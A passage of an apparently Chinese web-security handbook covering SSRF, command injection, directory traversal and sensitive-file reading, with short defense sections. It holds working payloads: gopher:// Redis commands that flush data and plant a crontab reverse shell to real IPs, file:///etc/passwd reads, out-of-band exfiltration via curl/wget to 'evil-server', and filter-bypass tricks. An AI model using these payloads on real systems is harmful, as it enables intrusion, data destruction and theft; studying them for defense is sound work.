class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">curl</span> <span class="cm-attribute">-vvv</span> <span class="cm-string">'dict://127.0.0.1:6379/info'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">curl</span> <span class="cm-attribute">-vvv</span> <span class="cm-string">'file:///etc/passwd'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># 注意: 链接使用单引号，避免$变量问题</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">curl</span> <span class="cm-attribute">-vvv</span> <span class="cm-string">'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">%0a<span class="cm-def">$1</span>%0d%0a1%0d%0a<span class="cm-def">$6</span><span class="cm-number">4</span>%0d%0a%0d%0a%0a%0a*/1 * * * * <span class="cm-builtin">bash</span> <span class="cm-attribute">-i</span> &gt;&amp; /dev/tcp/103.21.140.84/</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">6789</span> <span class="cm-number">0</span>&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a<span class="cm-def">$6</span>%0d%0aconfig%0d%0a<span class="cm-def">$3</span>%0d%0aset%0d</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">%0a<span class="cm-def">$3</span>%0d%0adir%0d%0a<span class="cm-def">$1</span><span class="cm-number">6</span>%0d%0a/var/spool/cron/%0d%0a*4%0d%0a<span class="cm-def">$6</span>%0d%0aconfig%0d%0a<span class="cm-def">$3</span>%0d</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">%0aset%0d%0a<span class="cm-def">$1</span><span class="cm-number">0</span>%0d%0adbfilename%0d%0a<span class="cm-def">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="cm-def">$4</span>%0d%0asave%0d%0aquit</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">%0d%0a<span class="cm-string">'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 317px;"></div><div class="CodeMirror-gutters" style="height: 317px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h3 id='443--相关危险函数'><span>4.4.3  相关危险函数</span></h3><blockquote><p><span>SSRF 涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以 PHP 为例，涉及到的函数有</span></p><p><span>file_get_contents() / fsockopen() / curl_exec() 等。</span></p></blockquote><h3 id='444--过滤绕过'><span>4.4.4  过滤绕过</span></h3><h4 id='更改-ip-地址写法'><span>更改 IP 地址写法</span></h4><p><span>一些开发者会通过对传过来的 URL 参数进行正则匹配的方式来过滤掉内网 IP，如采用如下正则表达式：</span></p><ul><li><span>^10(</span><span>.</span><span>(</span>[<span>2</span>][0-4]<span>\d|</span>[<span>2</span>][5]<span>[0-5]|[01]?\d?\d)){3}$ </span></li><li><span>^172</span><span>.</span><span>(</span>[<span>1</span>][6-9]<span>|[2]\d|3[01])(</span><span>.</span><span>(</span>[<span>2</span>][0-4]<span>\d|</span>[<span>2</span>][5]<span>[0-5]|[01]?\d?\d)){2}$ </span></li><li><span>^192</span><span>.</span><span>168(</span><span>.</span><span>(</span>[<span>2</span>][0-4]<span>\d|</span>[<span>2</span>][5]<span>[0-5]|[01]?\d?\d)){2}$</span></li></ul><p><span>对于这种过滤我们采用改编 IP 的写法的方式进行绕过，例如 192.168.0.1 这个 IP 地址可以被改写成：</span></p><ul><li><span>8 进制格式：0300.0250.0.1</span></li><li><span>16 进制格式：0xC0.0xA8.0.1</span></li><li><span>10 进制整数格式：3232235521</span></li><li><span>16 进制整数格式：0xC0A80001</span></li><li><span>合并后两位：1.1.278 / 1.1.755</span></li><li><span>合并后三位：1.278 / 1.755 / 3.14159267</span></li></ul><p><span>另外 IP 中的每一位，各个进制可以混用。</span></p><p><span>访问改写后的 IP 地址时，Apache 会报 400 Bad Request，但 Nginx、MySQL 等其他服务仍能正常工作。另外，0.0.0.0 这个 IP 可以直接访问到本地，也通常被正则过滤遗漏。</span></p><h4 id='使用解析到内网的域名'><span>使用解析到内网的域名</span></h4><blockquote><p><span>如果服务端没有先解析 IP 再过滤内网地址，我们就可以使用 localhost 等解析到内网的域名。</span></p><p><span>另外 xip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的 IP，例如 192.168.0.1.xip.io，解析到 192.168.0.1。</span></p></blockquote><h4 id='利用解析-url-所出现的问题'><span>利用解析 URL 所出现的问题</span></h4><blockquote><p><span>在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。</span></p><p><span>比如 </span><a href='mailto:http://www.baidu.com@192.168.0.1/' target='_blank' class='url'>http://www.baidu.com@192.168.0.1/</a><span> 当后端程序通过不正确的正则表达式（比如将 http 之后到 com为止的字符内容，也就是 </span><a href='http://www.baidu.com/'><span>www.baidu.com</span></a><span>，认为是访问请求的 host 地址时）对上述 URL 的内容进行解析的时候，很有可能会认为访问 URL 的 host 为 </span><a href='http://www.baidu.com/'><span>www.baidu.com</span></a><span>，而实际上这个 URL 所请求的内容都是 192.168.0.1 上的内容。</span></p></blockquote><h4 id='利用跳转'><span>利用跳转</span></h4><blockquote><p><span>如果后端服务器在接收到参数后，正确的解析了 URL 的 host，并 进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</span></p><p><span>可以使用如 </span><a href='http://httpbin.org/redirect-to?url=http%3A//192.168.0.1'><span>http://httpbin.org/redirect-to?url=http://192.168.0.1</span></a><span> 等服务跳转，但是由于 URL 中包含了</span></p><p><span>192.168.0.1 这种内网 IP 地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</span></p><p><span>常用的跳转有 302 跳转和 307 跳转，区别在于 307 跳转会转发 POST 请求中的数据等，但是 302 跳转不会。</span></p></blockquote><h4 id='通过各种非-http-协议'><span>通过各种非 HTTP 协议</span></h4><blockquote><p><span>如果服务器端程序对访问 URL 所采用的协议进行验证的话，可以通过非 HTTP 协议来进行利用。</span></p><p><span>比如通过 gopher，可以在一个 url 参数中构造 POST 或者 GET 请求，从而达到攻击内网应用的目的。例如可以使用 gopher 协议对与内网的 Redis 服务进行攻击，可以使用如下的 URL：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33594px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gopher://127.0.0.1:6379/_*1%0d%0a<span class="cm-def">$8</span>%0d%0aflushall%0d%0a*3%0d%0a<span class="cm-def">$3</span>%0d%0aset%0d%0a<span class="cm-def">$1</span>%0d%0a1%0d%0a<span class="cm-def">$6</span><span class="cm-number">4</span>%0d%0a%0d%0a%0a%0a*/1* * * * <span class="cm-builtin">bash</span> <span class="cm-attribute">-i</span>&gt;&amp;/dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a<span class="cm-def">$6</span>%0d%0aconfig%0d%0a<span class="cm-def">$3</span>%0d%0aset%0d%0a<span class="cm-def">$3</span>%0d%0adir%0d%0a<span class="cm-def">$1</span><span class="cm-number">6</span>%0d%0a/var/spool/cron/%0d%0a*4%0d%0a<span class="cm-def">$6</span>%0d%0aconfig%0d%0a<span class="cm-def">$3</span>%0d%0aset%0d%0a<span class="cm-def">$1</span><span class="cm-number">0</span>%0d%0adbfilename%0d%0a<span class="cm-def">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="cm-def">$4</span>%0d%0asave%0d%0aquit%0d%0a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 136px;"></div><div class="CodeMirror-gutters" style="height: 136px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><blockquote><p><span>除了 gopher 协议，File 协议也是 SSRF 中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 file:///path/to/file 这种格式来访问计算机本地文件。使用 file 协议可以避免服务端程序对于所访问的 IP 进行的过滤。例如我们可以通过 file:///d:/1.txt 来访问 D 盘中 1.txt 的内容。</span></p></blockquote><h4 id='dns-rebinding'><span>DNS Rebinding</span></h4><blockquote><p><span>一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS</span></p><p><span>服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。</span></p><p><span>但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。</span></p><p><span>要完成 DNS 重绑定攻击，我们需要一个域名，并 将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：</span></p></blockquote><ul><li><span>服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP</span></li><li><span>对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证</span></li><li><span>服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次DNS 服务器返回的是内网地址。</span></li><li><span>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</span></li></ul><h4 id='利用-ipv6'><span>利用 IPv6</span></h4><blockquote><p><span>有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如 </span><span>[</span><span>::</span><span>]</span><span> 0000::1 或</span></p><p><span>IPv6 的内网域名来绕过过滤。</span></p></blockquote><h4 id='利用-idn'><span>利用 IDN</span></h4><blockquote><p><span>一些网络访问工具如 Curl 等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</span></p><p><span>在这些字符中，部分字符会在访问时做一个等价转换，例如 . 和 example.com 等同。利用这种方式，可以用 等字符绕过内网限制。</span></p></blockquote><h3 id='445--可能的利用点'><span>4.4.5  可能的利用点</span></h3><h4 id='内网服务'><span>内网服务</span></h4><ul><li><span>Apache Hadoop 远程命令执行</span></li><li><span>axis2-admin 部署 Server 命令执行</span></li><li><span>Confluence SSRF</span></li><li><span>counchdb WEB API 远程命令执行</span></li><li><span>dict</span></li><li><span>docker API 远程命令执行</span></li><li><span>Elasticsearch 引擎 Groovy 脚本命令执行</span></li><li><span>ftp / ftps（FTP 爆破）</span></li><li><span>glassfish 任意文件读取和 war 文件部署间接命令执行</span></li><li><span>gopher</span></li><li><span>HFS 远程命令执行</span></li><li><span>http、https</span></li><li><span>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</span></li><li><span>Java 调试接口命令执行</span></li><li><span>JBOSS 远程 Invoker war 命令执行</span></li><li><span>Jenkins Scripts 接口命令执行</span></li><li><span>ldap</span></li><li><span>mongodb</span></li><li><span>php_fpm/fastcgi 命令执行</span></li><li><span>rtsp - smb/smbs（连接 SMB）</span></li><li><span>sftp</span></li><li><span>ShellShock 命令执行</span></li><li><span>Struts2 命令执行</span></li><li><span>telnet</span></li><li><span>tftp（UDP 协议扩展）</span></li><li><span>tomcat 命令执行</span></li><li><span>WebDav PUT 上传任意文件</span></li><li><span>WebSphere Admin 可部署 war 间接命令执行</span></li><li><span>zentoPMS 远程命令执行</span></li></ul><h4 id='redis-利用'><span>Redis 利用</span></h4><ul><li><span>写 ssh 公钥</span></li><li><span>写 crontab</span></li><li><span>写 WebShell</span></li><li><span>Windows 写启动项</span></li><li><span>主从复制加载.so 文件</span></li><li><span>主从复制写无损文件</span></li></ul><h4 id='云主机'><span>云主机</span></h4><blockquote><p><span>在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。</span></p></blockquote><h3 id='446--防御方式'><span>4.4.6  防御方式</span></h3><ul><li><span>过滤返回的信息</span></li><li><span>统一错误信息</span></li><li><span>限制请求的端口</span></li><li><span>禁止不常用的协议</span></li><li><span>对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单</span></li></ul><h3 id='447--参考链接'><span>4.4.7  参考链接</span></h3><ul><li><a href='http://www.91ri.org/17111.html'><span>SSRF 漏洞分析与利用</span></a></li><li><a href='https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf'><span>A New Era Of SSRF</span></a></li><li><a href='https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51'><span>php ssrf technique</span></a></li><li><a href='https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html'><span>谈一谈如何在 Python 开发中拒绝 SSRF 漏洞</span></a></li><li><a href='http://blog.safebuff.com/2016/07/03/SSRF-Tips/'><span>SSRF Tips</span></a></li><li><a href='https://joychou.org/web/phpssrf.html'><span>SSRF in PHP</span></a></li></ul><p>&nbsp;</p><h2 id='45--命令注入'><span>4.5  命令注入</span></h2><h3 id='451--简介'><span>4.5.1  简介</span></h3><blockquote><p><span>命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。</span></p><p><span>该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</span></p></blockquote><h3 id='452--常见危险函数'><span>4.5.2  常见危险函数</span></h3><h4 id='php-1'><span>PHP</span></h4><ul><li><span>system</span></li><li><span>exec</span></li><li><span>passthru</span></li><li><span>shell_exec</span></li><li><span>popen</span></li><li><span>proc_open</span></li></ul><h4 id='python-1'><span>Python</span></h4><ul><li><span>system</span></li><li><span>popen</span></li><li><span>subprocess.call</span></li><li><span>spawn</span></li></ul><h4 id='java-1'><span>Java</span></h4><ul><li><span>java.lang.Runtime.getRuntime().exec(command)</span></li></ul><h3 id='453--常见注入方式'><span>4.5.3  常见注入方式</span></h3><ul><li><span>分号分割</span></li><li><span>|</span><span>|</span><span> &amp;&amp; &amp; 分割</span></li><li><span>|</span><span> 管道符</span></li><li><span>\</span><span>r</span><span>\</span><span>n %d0%a0 换行</span></li><li><span>反引号解析</span></li><li><span>$</span><span>() 替换</span></li></ul><h3 id='454--无回显技巧'><span>4.5.4  无回显技巧</span></h3><ul><li><p><span>bash反弹shell</span></p></li><li><p><span>DNS带外数据</span></p></li><li><h5 id='http带外'><span>http带外</span></h5><ul><li><span>curl </span><a href='http://evil-server/%24(whoami)'><span>http://evil-server/</span><span>$</span><span>(whoami)</span></a></li><li><span>wget </span><a href='http://evil-server/%24(whoami)'><span>http://evil-server/</span><span>$</span><span>(whoami)</span></a></li></ul></li><li><p><span>无带外时利用sleep或其他逻辑构造布尔条件</span></p></li></ul><h3 id='455--常见绕过方式'><span>4.5.5  常见绕过方式</span></h3><h4 id='空格绕过'><span>空格绕过</span></h4><ul><li><span>&lt;</span><span> 符号 cat</span><span>&lt;</span><span>123</span></li><li><span>\</span><span>t / %09</span></li><li><span>$</span><span>{IFS} 其中 {} 用来截断，比如 cat</span><span>$</span><span>IFS2 会被认为 IFS2 是变量名。另外，在后面加个 </span><span>$</span><span> 可以起到截断的作用，一般用 </span><span>$</span><span>9，因为 </span><span>$</span><span>9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串</span></li></ul><h4 id='黑名单绕过'><span>黑名单绕过</span></h4><ul><li><span>a=l;b=s;</span><span>$</span><span>a</span><span>$</span><span>b</span></li><li><span>base64 echo </span><span>&quot;</span><span>bHM=</span><span>&quot;</span><span> </span><span>|</span><span> base64 -d</span></li><li><span>/?in/?s =</span><span>&gt;</span><span> /bin/ls</span></li><li><span>连接符 cat /etc/pass</span><span>&#39;</span><span>w</span><span>&#39;</span><span>d</span></li><li><span>未定义的初始化变量 cat</span><span>$</span><span>x /etc/passwd</span></li></ul><h4 id='长度限制绕过'><span>长度限制绕过</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>5</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span><span class="cm-identifier">wget</span><span class="cm-error">\</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span><span class="cm-identifier">foo</span><span class="cm-punctuation">.</span><span class="cm-error">\</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span><span class="cm-identifier">com</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">ls</span> <span class="cm-operator">-</span><span class="cm-identifier">t</span><span class="cm-operator">&gt;</span><span class="cm-identifier">a</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">sh</span> <span class="cm-identifier">a</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="height: 113px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><blockquote><p><span>上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行直接在 Linux</span></p><p><span>终端下执行的话, 创建文件需要在重定向符号之前添加命令这里可以使用一些诸如 w,</span><span>[</span><span>之类的短命令，(使用</span></p><p><span>ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向而在 php 中,使用 shell_exec 等执行系统命令的函数的时候, 是不存在标准输入流的，所以可以直接创建文件。</span></p></blockquote><h3 id='456--常用符号'><span>4.5.6  常用符号</span></h3><h4 id='命令分隔符'><span>命令分隔符</span></h4><ul><li><span>%0a / %0d / </span><span>\</span><span>n / </span><span>\</span><span>r</span></li><li><span>;</span></li><li><span>&amp; / &amp;&amp;</span></li></ul><h4 id='通配符-2'><span>通配符</span></h4><ul><li><span>*</span><span> 0 到无穷个任意字符</span></li><li><span>? 一个任意字符</span></li><li><span>[</span><span> </span><span>]</span><span> 一个在括号内的字符，e.g. </span><span>[</span><span>abcd</span><span>]</span></li><li><span>[</span><span> - </span><span>]</span><span> 在编码顺序内的所有字符</span></li><li><span>[ ^ </span><span>]</span><span> 一个不在括号内的字符</span></li></ul><h3 id='457--防御'><span>4.5.7  防御</span></h3><ul><li><p><span>不使用时禁用相应函数</span></p></li><li><p><span>尽量不要执行外部的应用程序或命令</span></p></li><li><p><span>做输入的格式检查</span></p></li><li><h5 id='转义命令中的所有-shell-元字符'><span>转义命令中的所有 shell 元字符</span></h5><ul><li><span>shell元字符包括#&amp;;`,|*?~&lt;&gt;^()[]{}$\</span></li></ul></li></ul><p>&nbsp;</p><h2 id='46--目录穿越'><span>4.6  目录穿越</span></h2><h3 id='461--简介'><span>4.6.1  简介</span></h3><blockquote><p><span>目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用 ../ 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</span></p></blockquote><h3 id='462--攻击载荷'><span>4.6.2  攻击载荷</span></h3><h4 id='url-参数'><span>URL 参数</span></h4><ul><li><span>../</span></li><li><span>..</span><span>\</span></li><li><span>..;/</span></li></ul><h4 id='nginx-off-by-slash'><span>Nginx Off by Slash</span></h4><ul><li><a href='https://vuln.site.com/files../' target='_blank' class='url'>https://vuln.site.com/files../</a></li></ul><h4 id='unc-bypass'><span>UNC Bypass</span></h4><ul><li><span>\</span><span>\</span><span>localhost</span><span>\</span><span>c</span><span>$</span><span>\</span><span>windows</span><span>\</span><span>win.ini</span></li></ul><h3 id='463--过滤绕过'><span>4.6.3  过滤绕过</span></h3><ul><li><h5 id='单次替换'><span>单次替换</span></h5><ul><li><h4 id='-2'>…<span>//</span></h4></li></ul></li><li><p><span>URL 编码</span></p></li><li><h5 id='16-位-unicode-编码'><span>16 位 Unicode 编码</span></h5><ul><li><span>\u002e</span></li></ul></li><li><h5 id='超长-utf-8-编码'><span>超长 UTF-8 编码</span></h5><ul><li><span>\%e0%40%ae</span></li></ul></li></ul><h3 id='464--防御'><span>4.6.4  防御</span></h3><blockquote><p><span>在进行文件操作相关的 API 前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。</span></p><p><span>若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。</span></p></blockquote><h3 id='465--参考链接'><span>4.6.5  参考链接</span></h3><ul><li><a href='https://portswigger.net/web-security/file-path-traversal'><span>Directory traversal by portswigger</span></a></li><li><a href='https://www.owasp.org/index.php/Path_Traversal'><span>Path Traversal by OWASP</span></a></li><li><a href='https://blogs.msdn.microsoft.com/jeremykuhne/2016/04/21/path-normalization/'><span>path normalization</span></a></li><li><a href='https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf'><span>Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon</span></a></li></ul><p>&nbsp;</p><h2 id='47--文件读取'><span>4.7  文件读取</span></h2><blockquote><p><span>考虑读取可能有敏感信息的文件</span></p></blockquote><ul><li><h5 id='用户目录下的敏感文件'><span>用户目录下的敏感文件</span></h5><ul><li><span>.bash_history</span></li><li><span>.zsh_history</span></li><li><span>.profile</span></li><li><span>.bashrc</span></li><li><span>.gitconfig</span></li><li><span>.viminfo</span></li><li><span>passwd</span></li></ul></li><li><h5 id='应用的配置文件'><span>应用的配置文件</span></h5><ul><li><span>/etc/apache2/apache2.conf</span></li><li><span>/etc/nginx/nginx.conf</span></li></ul></li><li><h5 id='应用的日志文件'><span>应用的日志文件</span></h5><ul><li><span>/var/log/apache2/access.log</span></li><li><span>/var/log/nginx/access.log</span></li></ul></li><li><h5 id='站点目录下的敏感文件'><span>站点目录下的敏感文件</span></h5><ul><li><span>.svn/entries</span></li><li><span>.git/HEAD</span></li><li><span>WEB-INF/web.xml</span></li><li><span>.htaccess</span></li></ul></li><li><h5 id='特殊的备份文件'><span>特殊的备份文件</span></h5><ul><li><span>.swp</span></li><li><span>.swo</span></li><li><span>.bak</span></li><li><span>index.php~</span></li><li>…</li></ul></li><li><h5 id='python-的-cache'><span>Python 的 Cache</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div 